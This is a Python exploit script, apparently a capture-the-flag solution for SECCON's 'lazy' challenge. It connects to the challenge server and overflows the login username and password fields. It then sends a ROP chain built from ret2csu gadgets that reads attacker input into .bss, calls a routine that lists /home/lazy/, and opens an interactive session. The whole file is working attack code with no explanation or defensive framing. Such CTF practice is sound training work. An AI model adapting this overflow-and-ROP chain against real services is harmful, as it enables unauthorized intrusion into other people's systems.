from ptrlib import *

elf = ELF("./lazy")
#sock = Process("./lazy")
sock = Socket("lazy.chal.seccon.jp", 33333)

def login_user(username):
    sock.sendlineafter("Exit\n", "2")
    sock.sendlineafter(": ", username)
    sock.recvuntil(", ")
    sock.recvline()
    output = sock.recvline()
    return output
def login_pass(password):
    sock.sendlineafter(": ", password)
    return

rop_pop_rdi = 0x004015f3
rop_pop_rsi_r15 = 0x004015f1
rop_popper = 0x4015e6
rop_csu_init = 0x4015d0

# leak flag
username = b'A' * (0x5f + 0x58)
login_user(username)
password  = b'3XPL01717'
password += b'A' * (0x20 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x40 - len(password))
password += b'3XPL01717'
password += b'A' * (0x60 - len(password))
password += b'_H4CK3R_'
password += b'A' * (0x80 - len(password))
password += p64(0xdeadbeef)
password += p64(rop_popper)
password += p64(0)
password += p64(0)
password += p64(1)
password += p64(elf.got("read"))
password += p64(0x40)
password += p64(elf.section('.bss') + 0x200)
password += p64(0)
password += p64(rop_csu_init)
password += p64(0) * 2
password += p64(elf.section('.bss') + 0x800)
password += p64(0) * 4
password += p64(rop_pop_rdi)
password += p64(elf.section('.bss') + 0x200)
password += p64(0x400d7f)
login_pass(password)
sock.send("/home/lazy/")

for i in range(10):
    print(sock.recvline())

sock.interactive()
